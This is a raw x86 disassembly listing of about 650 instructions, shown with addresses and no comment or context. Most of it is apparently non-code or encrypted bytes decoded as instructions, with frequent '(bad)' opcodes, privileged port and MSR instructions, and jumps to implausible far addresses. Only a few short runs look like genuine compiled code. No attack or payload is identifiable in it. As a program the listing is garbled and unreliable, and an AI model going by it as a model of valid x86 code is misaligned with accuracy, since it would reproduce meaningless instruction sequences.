  415f26:	outs   dx,DWORD PTR ds:[esi]
  415f27:	fisttp QWORD PTR [ebp-0xcc61c62]
  415f2d:	hlt    
  415f2e:	loope  0x415f1e
  415f30:	jmp    0x415ec9
  415f32:	mov    eax,0x332959aa
  415f37:	fimul  DWORD PTR [ebx-0xb5b1523]
  415f3d:	aas    
  415f3e:	xchg   esp,eax
  415f3f:	mov    edx,0x1ff4a36b
  415f44:	inc    BYTE PTR [ebx+ebx*2]
  415f47:	push   edx
  415f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f49:	scas   eax,DWORD PTR es:[edi]
  415f4a:	mov    dh,0x75
  415f4c:	jg     0x415f89
  415f4e:	(bad)  
  415f4f:	test   al,0xe0
  415f51:	jmp    0x415f3e
  415f53:	repnz in eax,0x82
  415f56:	fstp   TBYTE PTR [edx+0x74]
  415f59:	repz mov bl,0x91
  415f5c:	mov    esp,0x127d490b
  415f61:	jle    0x415f76
  415f63:	xor    cl,BYTE PTR [ebx]
  415f65:	mov    dl,0x35
  415f67:	jno    0x415fbd
  415f69:	sti    
  415f6a:	(bad)  
  415f6b:	in     al,0xd1
  415f6d:	jne    0x415f0e
  415f6f:	(bad)  
  415f70:	ficomp DWORD PTR [ebx]
  415f72:	and    edi,DWORD PTR ds:0xf5fa2bdd
  415f78:	sbb    eax,0xfa69a763
  415f7d:	and    DWORD PTR [edi],0x93d7ab6e
  415f83:	pop    ebx
  415f84:	push   ebp
  415f85:	xor    eax,DWORD PTR es:[edx+0x57]
  415f89:	stos   BYTE PTR es:[edi],al
  415f8a:	fistp  DWORD PTR [ecx+0x740ad529]
  415f90:	push   es
  415f91:	sti    
  415f92:	std    
  415f93:	(bad)  
  415f94:	mov    edx,0x6a4deb24
  415f99:	jne    0x416010
  415f9b:	adc    dl,BYTE PTR [edi-0x202c57]
  415fa1:	loope  0x415f2c
  415fa3:	out    0x50,eax
  415fa5:	ins    BYTE PTR es:[edi],dx
  415fa6:	add    BYTE PTR [eax+0x14],bl
  415fa9:	jns    0x415fd0
  415fab:	stos   DWORD PTR es:[edi],eax
  415fac:	or     eax,0xc9338b81
  415fb1:	add    eax,0x66479db3
  415fb6:	adc    ecx,0xffff7223
  415fbc:	xor    eax,0x8dacd260
  415fc1:	xor    ecx,0xacff
  415fc7:	cmp    eax,0xebeb4fd3
  415fcc:	jmp    0x416097
  415fd1:	retf   
  415fd2:	fwait
  415fd3:	xchg   edx,eax
  415fd4:	sbb    eax,0xdfcf1dd2
  415fd9:	mov    bh,0x1d
  415fdb:	sbb    eax,0x4d1ff5cd
  415fe0:	xor    eax,DWORD PTR [ebx-0x51ffff08]
  415fe6:	add    BYTE PTR [eax],al
  415fe8:	add    BYTE PTR ds:0xc8727021,bh
  415fee:	arpl   WORD PTR [bx+si+0x31],cx
  415ff2:	mov    bl,0x57
  415ff4:	hlt    
  415ff5:	call   0x97:0xd7fe1a5
  415ffc:	or     ecx,DWORD PTR [ecx+0x78]
  415fff:	mov    WORD PTR [eax+eax*1],fs
  416002:	popf   
  416003:	loope  0x415ff8
  416005:	push   cs
  416006:	mov    ebx,0xa52aaf3e
  41600b:	push   0x8cc724e1
  416010:	arpl   WORD PTR [eax],cx
  416012:	icebp  
  416013:	push   edx
  416014:	xchg   esp,eax
  416015:	das    
  416016:	sub    eax,0x674cfe8e
  41601b:	sbb    ebp,ebp
  41601d:	mov    eax,0x73c05a75
  416022:	cdq    
  416023:	in     al,dx
  416024:	jno    0x416081
  416026:	or     al,BYTE PTR [esi+0x3782a8bc]
  41602c:	aas    
  41602d:	mov    BYTE PTR [ebx],ch
  41602f:	ins    BYTE PTR es:[edi],dx
  416030:	mov    esp,DWORD PTR [esi]
  416032:	(bad)  
  416033:	mov    ch,0xce
  416035:	push   ecx
  416036:	sar    DWORD PTR ds:[ebp+0x3bb34ccf],1
  41603d:	jb     0x416043
  41603f:	adc    esp,DWORD PTR [ebx+0x1e0957c8]
  416045:	out    0xc9,eax
  416047:	(bad)  
  416048:	imul   edi,DWORD PTR [esi],0xffffffd1
  41604b:	ss leave 
  41604d:	or     esi,ebp
  41604f:	nop
  416050:	inc    BYTE PTR [edx+0x7e]
  416053:	aas    
  416054:	repz in eax,dx
  416056:	add    BYTE PTR [esi+0x68],al
  416059:	(bad)  
  41605a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41605b:	daa    
  41605c:	mov    bh,0xb9
  41605e:	inc    ebp
  41605f:	xor    BYTE PTR [ebx+0x2e],dl
  416062:	cmc    
  416063:	jp     0x4160cf
  416065:	ins    BYTE PTR es:[edi],dx
  416066:	jecxz  0x4160b7
  416068:	and    DWORD PTR [ebp+ebp*4+0x4a8f504],ebp
  41606f:	and    eax,0xd8f8d61b
  416074:	jmp    0x7f7ca7ed
  416079:	shl    BYTE PTR [esi-0x291e3446],1
  41607f:	fdivp  st(1),st
  416081:	loopne 0x4160b8
  416083:	mov    al,bl
  416085:	xor    DWORD PTR [edx],esi
  416087:	hlt    
  416088:	mov    ds:0xb61c1b16,al
  41608d:	mov    bl,0x36
  41608f:	xlat   BYTE PTR ds:[ebx]
  416090:	sub    edx,DWORD PTR [edx+0x20]
  416093:	push   ecx
  416094:	test   DWORD PTR [ebx+0xc850fe9],ebx
  41609a:	add    BYTE PTR [eax],al
  41609c:	add    BYTE PTR [ecx-0x212307],al
  4160a2:	dec    DWORD PTR [edi]
  4160a4:	test   BYTE PTR [edi-0x72fffff9],ch
  4160aa:	inc    ebp
  4160ab:	lock mov DWORD PTR [ebp-0x88],eax
  4160b2:	mov    eax,DWORD PTR [ebp-0x60]
  4160b5:	mov    DWORD PTR [ebp-0x10],eax
  4160b8:	jmp    0x416183
  4160bd:	cdq    
  4160be:	nop
  4160bf:	add    al,0x7c
  4160c1:	or     eax,0x9ff5f9fc
  4160c6:	hlt    
  4160c7:	bound  ecx,QWORD PTR [esi+0x6a]
  4160ca:	js     0x4160ca
  4160cc:	mov    eax,ds:0xf931
  4160d1:	scas   al,BYTE PTR es:[edi]
  4160d2:	add    BYTE PTR [eax],al
  4160d4:	add    bl,dh
  4160d6:	xchg   edi,eax
  4160d7:	pop    eax
  4160d8:	ins    DWORD PTR es:[edi],dx
  4160d9:	add    BYTE PTR [edx+edx*4-0x70],bl
  4160dd:	sbb    al,0x88
  4160df:	mov    bh,BYTE PTR [esi]
  4160e1:	sbb    eax,DWORD PTR [eax+eiz*2-0x3cca7b0a]
  4160e8:	nop
  4160e9:	test   BYTE PTR [eax-0x45],ch
  4160ec:	mov    ah,0x48
  4160ee:	jg     0x41613b
  4160f0:	imul   edx,DWORD PTR [ebx],0xb6d34503
  4160f6:	xor    ebp,DWORD PTR [eax]
  4160f8:	clc    
  4160f9:	ret    
  4160fa:	jge    0x4160bd
  4160fc:	and    dl,BYTE PTR [esi-0x4]
  4160ff:	adc    eax,0x8ce0b3c4
  416104:	inc    esi
  416105:	pushf  
  416106:	dec    ebp
  416107:	(bad)  
  416108:	sbb    eax,ecx
  41610a:	mov    ebp,0x1db964ae
  41610f:	sar    DWORD PTR [ebx+0x30],cl
  416112:	jb     0x41613b
  416114:	in     al,dx
  416115:	mov    DWORD PTR [ebx-0x7c],esp
  416118:	sbb    edi,DWORD PTR [ebp+0x73]
  41611b:	repnz or al,0x5c
  41611e:	sbb    DWORD PTR [eax-0x7b7a457],ebp
  416124:	loopne 0x4160b7
  416126:	fs aas 
  416128:	adc    al,0xb2
  41612a:	pop    ecx
  41612b:	mov    esi,0x934a33fb
  416130:	sub    al,dh
  416132:	xchg   edx,eax
  416133:	rol    edx,0xf2
  416136:	inc    esi
  416137:	inc    edi
  416138:	aaa    
  416139:	add    al,0x9d
  41613b:	inc    edx
  41613c:	out    dx,eax
  41613d:	shl    BYTE PTR [edx+0x16],0xa8
  416141:	(bad)  
  416142:	jmp    0x69af:0x6bd6f821
  416149:	pusha  
  41614a:	outs   dx,DWORD PTR ds:[esi]
  41614b:	mov    ecx,?
  41614d:	shr    DWORD PTR [eax],1
  41614f:	push   esp
  416150:	xor    bl,0xab
  416153:	and    ah,BYTE PTR es:[esi]
  416156:	call   0x78d39533
  41615b:	lock jp 0x41613b
  41615e:	push   ecx
  41615f:	add    ebp,eax
  416161:	push   0x22
  416163:	xor    ebx,DWORD PTR [edx-0x3e]
  416166:	xchg   ebx,eax
  416167:	scas   eax,DWORD PTR es:[edi]
  416168:	jnp    0x416168
  41616a:	loop   0x416189
  41616c:	fisub  WORD PTR [ebx]
  41616e:	sub    eax,0x38bef2a9
  416173:	dec    ecx
  416174:	sbb    cl,BYTE PTR [ebx]
  416176:	fwait
  416177:	add    eax,0x3c14b44f
  41617c:	or     al,0x41
  41617e:	xor    DWORD PTR [eax+ecx*2+0x458bb69d],ebx
  416185:	lock jmp 0x416251
  41618b:	push   eax
  41618c:	rcl    BYTE PTR [eax+ecx*1-0x2723b36c],1
  416193:	mov    esi,0x121c8c43
  416198:	cmp    ebx,DWORD PTR [ecx+edx*1-0x21]
  41619c:	stc    
  41619d:	add    BYTE PTR [eax],al
  41619f:	scas   al,BYTE PTR es:[edi]
  4161a0:	add    BYTE PTR [eax],al
  4161a2:	add    al,cl
  4161a4:	daa    
  4161a5:	lock mov ss,edx
  4161a8:	pop    ebx
  4161a9:	cmp    al,0xc
  4161ab:	es and al,0xdd
  4161ae:	pop    eax
  4161af:	cwde   
  4161b0:	xor    DWORD PTR [ecx+0x11],eax
  4161b3:	push   ds
  4161b4:	wrmsr  
  4161b6:	or     eax,0x7f3f4877
  4161bb:	lock dec ebp
  4161bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161be:	jno    0x416163
  4161c0:	mov    eax,0x5ba66653
  4161c5:	xchg   esi,eax
  4161c6:	fiadd  WORD PTR [edx+0x71]
  4161c9:	fmul   st,st(3)
  4161cb:	lea    esi,ds:0x76d8ce9f
  4161d1:	or     BYTE PTR [ecx-0x65],bl
  4161d4:	dec    esp
  4161d5:	jge    0x4161b4
  4161d7:	mov    dl,0x99
  4161d9:	adc    eax,0xb348ba6b
  4161de:	cmp    cl,bl
  4161e0:	into   
  4161e1:	xchg   ecx,eax
  4161e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161e3:	arpl   WORD PTR [esi+0x71e25e43],cx
  4161e9:	das    
  4161ea:	xor    DWORD PTR [eax+0x5f],ebx
  4161ed:	outs   dx,BYTE PTR ds:[esi]
  4161ee:	sub    cl,al
  4161f0:	cmp    edx,edi
  4161f2:	jb     0x416193
  4161f4:	shl    ecx,0xbb
  4161f7:	lea    ebp,[esi]
  4161f9:	ret    0xbdbe
  4161fc:	dec    esi
  4161fd:	js     0x416251
  4161ff:	lods   al,BYTE PTR ds:[esi]
  416200:	xlat   BYTE PTR ds:[ebx]
  416201:	loopne 0x41626a
  416203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416204:	xor    al,0x39
  416206:	jnp    0x416205
  416208:	inc    ebx
  416209:	scas   al,BYTE PTR es:[edi]
  41620a:	arpl   di,si
  41620c:	mov    BYTE PTR [edi+0x3753925c],0xa8
  416213:	sbb    dl,0x4
  416216:	sub    eax,0xc1d90f6
  41621b:	xchg   ebx,eax
  41621c:	jl     0x416263
  41621e:	mov    ah,0x44
  416220:	mov    esi,0x5e78c7c3
  416225:	sub    bl,ch
  416227:	retf   
  416228:	sbb    DWORD PTR [esi],ebp
  41622a:	sub    DWORD PTR [eax-0xcd7cad4],0xffffff8c
  416231:	sub    eax,0xc52e8480
  416236:	sbb    esp,DWORD PTR [ebp+eiz*8-0x64]
  41623a:	xor    bh,BYTE PTR ds:[edx]
  41623d:	mov    dh,0x9e
  41623f:	jmp    ebx
  416241:	call   0xd3529126
  416246:	push   cs
  416247:	mov    ebp,0x2afee6f8
  41624c:	add    al,0xb8
  41624e:	add    bh,BYTE PTR [edx]
  416250:	mov    ds:0x2bfc4d8b,al
  416255:	ror    DWORD PTR [ecx-0x39160fbb],0x0
  41625c:	add    BYTE PTR [eax],al
  41625e:	and    bh,BYTE PTR [ecx]
  416260:	pop    edi
  416261:	xchg   edi,eax
  416262:	pop    edi
  416263:	imul   edx
  416265:	mov    ebp,0x5fd3f27f
  41626a:	cld    
  41626b:	(bad)  
  41626c:	push   ecx
  41626d:	sbb    al,0x8d
  41626f:	cli    
  416270:	add    BYTE PTR [eax],al
  416272:	scas   al,BYTE PTR es:[edi]
  416273:	add    BYTE PTR [eax],al
  416275:	add    bl,al
  416277:	xchg   esp,eax
  416278:	aaa    
  416279:	stos   DWORD PTR es:[edi],eax
  41627a:	sbb    al,0x5e
  41627c:	cmp    eax,esi
  41627e:	jmp    0xc8d03f4c
  416283:	sbb    al,0x1e
  416285:	mov    ebp,0x55555867
  41628a:	scas   al,BYTE PTR es:[edi]
  41628b:	xchg   esi,eax
  41628c:	sub    ch,BYTE PTR [eax-0x6f]
  41628f:	mov    dh,0x1d
  416291:	aam    0xb
  416293:	mov    edi,0xbc5110da
  416298:	mov    bl,0xfa
  41629a:	out    dx,eax
  41629b:	cmp    eax,0xa413c643
  4162a0:	jle    0x41625e
  4162a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162a3:	push   ds
  4162a4:	cbw    
  4162a6:	retf   
  4162a7:	dec    ebp
  4162a8:	cli    
  4162a9:	jae    0x416254
  4162ab:	xor    eax,0xdc9f6378
  4162b0:	dec    eax
  4162b1:	or     DWORD PTR [ebp-0x6f],esp
  4162b4:	xchg   edi,eax
  4162b5:	pop    ds
  4162b6:	jne    0x416332
  4162b8:	push   0x70
  4162ba:	gs ins BYTE PTR es:[edi],dx
  4162bc:	std    
  4162bd:	test   eax,0x1d961b42
  4162c2:	pop    edx
  4162c3:	sub    DWORD PTR [esi+0x7],eax
  4162c6:	xchg   edx,eax
  4162c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c8:	push   esp
  4162c9:	scas   al,BYTE PTR es:[edi]
  4162ca:	mov    dh,0xf1
  4162cc:	sbb    al,0xad
  4162ce:	(bad)  
  4162cf:	cli    
  4162d0:	mov    eax,DWORD PTR ds:0x18a9692f
  4162d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d7:	mov    edx,DWORD PTR [edi+0x2231e50f]
  4162dd:	cmp    ah,BYTE PTR [ebp+0x30]
  4162e0:	gs int 0x50
  4162e3:	mov    ebp,0xfb766cf5
  4162e8:	daa    
  4162e9:	test   ch,al
  4162eb:	push   ebx
  4162ec:	add    DWORD PTR [esi-0x4543903e],esi
  4162f2:	adc    ebp,DWORD PTR [eax+0x18]
  4162f5:	ins    DWORD PTR es:[edi],dx
  4162f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f7:	lds    esi,FWORD PTR [ebx+0xe]
  4162fa:	jge    0x4162e5
  4162fc:	imul   ebx,ebx,0x26
  4162ff:	nop
  416300:	mov    cs,WORD PTR [ebp-0x6f6a6f4]
  416306:	push   0xffffff88
  416308:	jbe    0x41629b
  41630a:	jnp    0x41628f
  41630c:	add    ebp,DWORD PTR [ebx-0x2542c993]
  416312:	inc    ebp
  416313:	daa    
  416314:	jbe    0x416355
  416316:	push   ds
  416317:	xchg   ecx,eax
  416318:	lds    edx,FWORD PTR [ebp+0x331ae1f1]
  41631e:	scas   eax,DWORD PTR es:[edi]
  41631f:	xor    DWORD PTR [edx-0x74bd1af9],esi
  416325:	inc    ebp
  416326:	loopne 0x4162b3
  416328:	dec    ebp
  416329:	in     al,0x29
  41632b:	inc    ebp
  41632c:	lock mov eax,DWORD PTR [ebp-0x4]
  416330:	jmp    0x4163fb
  416335:	jle    0x416317
  416337:	and    eax,0x7ef5bf31
  41633c:	out    dx,eax
  41633d:	jnp    0x41635c
  41633f:	out    dx,al
  416340:	in     al,0x7b
  416342:	xchg   esp,eax
  416343:	inc    edi
  416344:	or     eax,0xfb3b
  416349:	scas   al,BYTE PTR es:[edi]
  41634a:	add    BYTE PTR [eax],al
  41634c:	add    ah,dh
  41634e:	bound  esp,QWORD PTR [eax+0x5d]
  416351:	xchg   BYTE PTR ss:[esi],al
  416354:	and    bh,ch
  416356:	sub    bh,BYTE PTR [ecx-0x11]
  416359:	sub    al,0xe1
  41635b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41635c:	popf   
  41635d:	daa    
  41635e:	xor    BYTE PTR [ecx+0x3d3458ec],0xec
  416365:	mov    cl,0xdb
  416367:	push   0xf
  416369:	inc    eax
  41636a:	and    dh,cl
  41636c:	pop    edx
  41636d:	mov    ch,0x1d
  41636f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416370:	mov    fs,esi
  416372:	sbb    eax,0x4f1692e1
  416377:	jbe    0x416351
  416379:	pop    esi
  41637a:	and    eax,0x36f7d78e
  41637f:	ja     0x4163de
  416381:	pusha  
  416382:	out    dx,eax
  416383:	xchg   edi,eax
  416384:	sub    DWORD PTR [esi-0x68ecf25b],edx
  41638a:	cdq    
  41638b:	loope  0x41634c
  41638d:	mov    ds:0xa9332cec,al
  416392:	jecxz  0x4163ce
  416394:	addr16 and al,0xd8
  416397:	mov    al,ds:0x919c0ce1
  41639c:	neg    esp
  41639e:	jl     0x416375
  4163a0:	push   cs
  4163a1:	call   0xba13:0x194e3b42
  4163a8:	test   BYTE PTR [ebx+0x1c31ecd5],dh
  4163ae:	pop    ecx
  4163af:	fcom   DWORD PTR [ebx+0x2cd3e598]
  4163b5:	out    0x96,al
  4163b7:	push   esp
  4163b8:	clc    
  4163b9:	sub    al,0x4b
  4163bb:	mov    ebx,0x264f8d63
  4163c0:	in     al,0xb5
  4163c2:	inc    edi
  4163c3:	cli    
  4163c4:	mov    ebp,0x761ab869
  4163c9:	xchg   edx,eax
  4163ca:	test   ax,0xec22
  4163ce:	sub    BYTE PTR [edx-0x7bd7ea],dl
  4163d4:	aaa    
  4163d5:	cld    
  4163d6:	dec    edx
  4163d7:	and    DWORD PTR [edx],esi
  4163d9:	mov    bh,0xf4
  4163db:	jns    0x41641a
  4163dd:	or     ah,dh
  4163df:	pusha  
  4163e0:	pusha  
  4163e1:	fucomip st,st(7)
  4163e3:	push   edi
  4163e4:	sub    eax,DWORD PTR [edi+0x5a]
  4163e7:	inc    ebx
  4163e8:	int    0xc3
  4163ea:	(bad)  
  4163eb:	out    dx,eax
  4163ec:	dec    ecx
  4163ed:	xor    eax,0xf241add2
  4163f2:	jno    0x416384
  4163f4:	xor    ebp,edx
  4163f6:	(bad)  
  4163f7:	test   eax,0xc7b33c88
  4163fc:	add    cl,ch
  4163fe:	push   ebp
  4163ff:	push   esi
  416400:	inc    ebp
  416401:	jmp    0x4164cc
  416406:	cmc    
  416407:	int3   
  416408:	mov    ah,0xd6
  41640a:	mov    ebp,0x76eff7fe
  41640f:	lods   al,BYTE PTR ds:[esi]
  416410:	mov    edx,0xc0986c92
  416415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416416:	jmp    0xae416516
  41641b:	add    BYTE PTR [eax],al
  41641d:	add    BYTE PTR [edi-0x52],cl
  416420:	cwde   
  416421:	pop    edi
  416422:	fsubrp st(7),st
  416424:	push   cs
  416425:	mov    edi,0x82b855d7
  41642a:	aaa    
  41642b:	int3   
  41642c:	ret    0x8212
  41642f:	push   ecx
  416430:	inc    esi
  416431:	sbb    eax,0x2865670d
  416436:	mov    al,0x89
  416438:	out    dx,al
  416439:	out    dx,eax
  41643a:	jno    0x416467
  41643c:	and    al,0xd
  41643e:	in     eax,0x9f
  416440:	fist   WORD PTR [edx]
  416442:	stos   DWORD PTR es:[edi],eax
  416443:	pop    ebx
  416444:	dec    edi
  416445:	(bad)  
  416446:	inc    DWORD PTR [eax]
  416448:	adc    al,0x4c
  41644a:	(bad)  
  41644b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41644c:	sbb    eax,0xe14dbd37
  416451:	or     ecx,DWORD PTR ds:0xeaf571
  416457:	mov    ds:0xde63afce,al
  41645c:	test   al,0x40
  41645e:	ins    BYTE PTR es:[edi],dx
  41645f:	adc    BYTE PTR [ecx-0x7786a9fe],cl
  416465:	shl    DWORD PTR [edx+0x462acbd6],0x86
  41646c:	clc    
  41646d:	add    DWORD PTR [edi+0x6d],0x14273cf2
  416474:	add    ebx,eax
  416476:	out    0xd2,eax
  416478:	icebp  
  416479:	(bad)  
  41647a:	push   cs
  41647b:	and    BYTE PTR [ebx],bh
  41647d:	cs inc esp
  41647f:	jle    0x416472
  416481:	mov    dl,0x94
  416483:	rcl    DWORD PTR [esi-0x7f],cl
  416486:	js     0x4164f8
  416488:	mov    ecx,0xcf762670
  41648d:	mov    ebx,0xcadbcae6
  416492:	movd   DWORD PTR [esi],mm5
  416495:	(bad)  
  416496:	sbb    eax,0xd9431f8e
  41649b:	push   edx
  41649c:	mov    BYTE PTR [ecx+0x6e],bh
  41649f:	inc    ebp
  4164a0:	imul   eax,DWORD PTR [edx-0x7a],0x3e6011a3
  4164a7:	add    cl,BYTE PTR [edx-0x67ff9e2e]
  4164ad:	xchg   ebp,eax
  4164ae:	inc    eax
  4164af:	sbb    BYTE PTR [esi],ah
  4164b1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4164b3:	xor    eax,0xaeba8853
  4164b8:	lahf   
  4164b9:	cmp    esi,DWORD PTR [esi+eax*8+0x7b]
  4164bd:	jmp    0x4b84:0x1f542685
  4164c4:	mov    esi,DWORD PTR [edx-0x1a1b44a7]
  4164ca:	lds    edi,FWORD PTR [ebx-0x39]
  4164cd:	inc    eax
  4164ce:	add    al,0x66
  4164d0:	push   esp
  4164d1:	push   edi
  4164d2:	ja     0x41645f
  4164d4:	inc    ebp
  4164d5:	lock jmp 0x4165a1
  4164db:	sub    esp,DWORD PTR [esp-0x406f5070]
  4164e2:	mov    edi,0xbb193d74
  4164e7:	cmp    DWORD PTR [eax-0x36821ef],ecx
  4164ed:	add    BYTE PTR [eax],al
  4164ef:	scas   al,BYTE PTR es:[edi]
  4164f0:	add    BYTE PTR [eax],al
  4164f2:	add    BYTE PTR [eax-0x8e6da70],cl
  4164f8:	sbb    esi,ebp
  4164fa:	cmc    
  4164fb:	retf   
  4164fc:	xor    eax,0xb21beeb4
  416501:	ret    0x74ac
  416504:	add    BYTE PTR [ecx],bh
  416506:	div    BYTE PTR [edi]
  416508:	xchg   ebx,eax
  416509:	pop    es
  41650a:	push   esp
  41650b:	cmp    eax,0x684c96a5
  416510:	dec    ebx
  416511:	fcomp  QWORD PTR [esp+eax*8+0x15]
  416515:	(bad)  
  416516:	xchg   ebp,eax
  416517:	or     eax,0x90cb7fb4
  41651c:	and    DWORD PTR [ebx+0x60],0x14b17e56
  416523:	test   edx,eax
  416525:	hlt    
  416526:	imul   ecx,ebx,0xe48f693c
  41652c:	jge    0x416557
  41652e:	(bad)
  416532:	sbb    al,0xf9
  416534:	xor    eax,0x6d7a5d19
  416539:	cld    
  41653a:	pop    ss
  41653b:	and    dl,BYTE PTR [edx+0x43]
  41653e:	inc    ecx
  41653f:	push   ebp
  416540:	sub    esp,ecx
  416542:	aaa    
  416543:	and    esp,esi
  416545:	bound  esi,QWORD PTR [eax-0x70146366]
  41654b:	in     eax,dx
  41654c:	mov    WORD PTR [edi*4+0x11edc1ec],?
  416553:	mov    WORD PTR [edi-0x6e2251ac],?
  416559:	retf   
  41655a:	popa   
  41655b:	mov    al,ds:0xe3089a4f
  416560:	stos   BYTE PTR es:[edi],al
  416561:	mov    dl,0xeb
  416563:	rcr    DWORD PTR [edi+eiz*4+0x7e],0xb
  416568:	sbb    BYTE PTR [ecx+ebx*2],dl
  41656b:	pushf  
  41656c:	retf   
  41656d:	stc    
  41656e:	ror    BYTE PTR [edi+0x76e98030],1
  416574:	loop   0x416525
  416576:	enter  0xcfe6,0x59
  41657a:	out    dx,eax
  41657b:	scas   eax,DWORD PTR es:[edi]
  41657c:	jmp    0xb9cc:0x564d91b1
  416583:	mov    ecx,0x6911ac3b
  416588:	adc    al,0x8c
  41658a:	xchg   ch,bl
  41658c:	mov    WORD PTR [ecx],ss
  41658e:	push   edx
  41658f:	test   DWORD PTR [esi-0xef1853d],ebx
  416595:	mov    eax,0x785a06e9
  41659a:	pop    edi
  41659b:	sar    BYTE PTR [esi+0x47],1
  41659e:	or     al,0xbc
  4165a0:	fmul   QWORD PTR [ebx+0x4189fc4d]
  4165a6:	add    DWORD PTR [ecx+0x42f030],esp
  4165ac:	jmp    0x416677
  4165b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165b2:	std    
  4165b3:	inc    ecx
  4165b4:	ss pop ebx
  4165b6:	mov    esi,0x92dfdf7
  4165bb:	and    bh,BYTE PTR [esp+edi*4+0x459fbae8]
  4165c2:	std    
  4165c3:	add    BYTE PTR [eax],al
  4165c5:	scas   al,BYTE PTR es:[edi]
  4165c6:	add    BYTE PTR [eax],al
  4165c8:	add    BYTE PTR [ecx],bl
  4165ca:	mov    edx,0x190c18df
  4165cf:	push   ds
  4165d0:	rcl    ecx,0x58
  4165d3:	mov    esi,0x126f9bdc
  4165d8:	push   eax
  4165d9:	adc    edx,DWORD PTR [edi]
  4165db:	sbb    al,0x50
  4165dd:	(bad)  
  4165de:	(bad)  
  4165e0:	push   edi
  4165e1:	test   DWORD PTR [ecx+0x29863ede],esi
  4165e7:	int3   
  4165e8:	ins    BYTE PTR es:[edi],dx
  4165e9:	jo     0x416596
  4165eb:	in     eax,dx
  4165ec:	in     eax,dx
  4165ed:	push   ecx
  4165ee:	ins    DWORD PTR es:[edi],dx
  4165ef:	xchg   ecx,eax
  4165f0:	and    ecx,DWORD PTR [eax]
  4165f2:	add    esi,DWORD PTR [eax]
  4165f4:	out    0x7,eax
  4165f6:	jmp    0x4165ab
  4165f8:	mov    bl,0xf8
  4165fa:	inc    ebp
  4165fb:	lea    edi,[esi+0x23]
  4165fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165ff:	mov    edi,0x18b1e363
  416604:	push   edi
  416605:	mov    DWORD PTR [edx-0x1a],ebx
  416608:	cmp    eax,0x581b5dd4
  41660d:	or     eax,0xddcf83ac
  416612:	aad    0x2a
  416614:	aaa    
  416615:	push   edi
  416616:	retf   0x4251
  416619:	push   cs
  41661a:	push   cs
  41661b:	mov    DWORD PTR [ebp+0x29],edx
  41661e:	add    ecx,ecx
  416620:	outs   dx,BYTE PTR ds:[esi]
  416621:	pop    es
  416622:	lods   al,BYTE PTR ds:[esi]
  416623:	mov    ecx,0x8b70304
  416628:	jo     0x4165ae
  41662a:	push   ecx
  41662b:	mov    eax,ds:0xafc6b68f
  416630:	pusha  
  416631:	int    0x83
  416633:	sub    BYTE PTR [ebx-0x1a9d6e48],ah
  416639:	and    DWORD PTR [ebp-0x47080d64],0xffffffba
  416640:	push   esp
  416641:	loope  0x4166b0
  416643:	pop    esi
  416644:	(bad)  
  416646:	in     al,dx
  416647:	shr    BYTE PTR [eax-0x395bf308],1
  41664d:	fdivr  DWORD PTR [ecx+0x8]
  416650:	mov    ds:0x51b97894,al
  416655:	sub    eax,0x4d6ea8b
  41665a:	mov    ebp,0x3f2630d8
  41665f:	in     al,0xfe
  416661:	mov    edx,0xececce06
  416666:	push   ds
  416667:	add    BYTE PTR ds:0x72393b05,al
  41666d:	jne    0x416651
  41666f:	inc    ebp
  416670:	sti    
  416671:	adc    DWORD PTR [esp+edx*4+0x7b],ecx
  416675:	mov    DWORD PTR [esi],edi
  416677:	push   DWORD PTR [eax]
  416679:	push   DWORD PTR ds:0x42f294
  41667f:	push   DWORD PTR ds:0x42f038
  416685:	push   DWORD PTR ds:0x42f274
  41668b:	push   DWORD PTR ds:0x42f30c
  416691:	jmp    0x41675c
  416696:	in     al,0x78
  416698:	jg     0x41667b
  41669a:	jmp    edi
  41669c:	(bad)  
  41669d:	jge    0x416631
  41669f:	or     al,0x48
  4166a1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4166a3:	dec    ebp
  4166a4:	mov    ebp,0xfdf3a1
  4166a9:	add    BYTE PTR [esi-0x44000000],ch
  4166af:	enter  0xffb9,0xdc
  4166b3:	arpl   WORD PTR [esi-0x5e],cx
  4166b6:	jg     0x41672b
  4166b8:	aas    
  4166b9:	push   es
  4166ba:	mov    cs,eax
  4166bc:	mov    ebp,ecx
  4166be:	ins    BYTE PTR es:[edi],dx
  4166bf:	dec    esp
  4166c0:	push   ss
  4166c1:	pop    ds
  4166c2:	or     al,0xc4
  4166c4:	fst    st(2)
  4166c6:	dec    ebp
  4166c7:	jecxz  0x416674
  4166c9:	push   esp
  4166ca:	ret    
  4166cb:	int3   
  4166cc:	(bad)  
  4166cd:	dec    esi
  4166ce:	sbb    DWORD PTR ds:0x231052ee,eax
  4166d4:	stos   WORD PTR es:[edi],ax
  4166d6:	cmp    edx,DWORD PTR [esp+ebx*4]
  4166d9:	out    0xb8,eax
  4166db:	jg     0x4166a8
  4166dd:	or     eax,0x54e92647
  4166e2:	and    BYTE PTR [edx],dl
  4166e4:	(bad)  
  4166e5:	in     eax,dx
  4166e6:	push   DWORD PTR [eax+0x33]
  4166e9:	jae    0x41674a
  4166eb:	jecxz  0x4166b0
  4166ed:	lods   al,BYTE PTR ds:[esi]
  4166ee:	xchg   esp,eax
  4166ef:	stc    
  4166f0:	and    bh,BYTE PTR [edi+0x38]
  4166f3:	leave  
  4166f4:	inc    ebx
  4166f5:	add    DWORD PTR [edx+0x4a],esp
  4166f8:	push   ebp
  4166f9:	fisttp DWORD PTR [esi+0x65]
  4166fc:	mov    ebx,0xbfea2225
  416701:	adc    al,0xec
  416703:	jg     0x416754
  416705:	adc    bh,BYTE PTR [eax+0x7b]
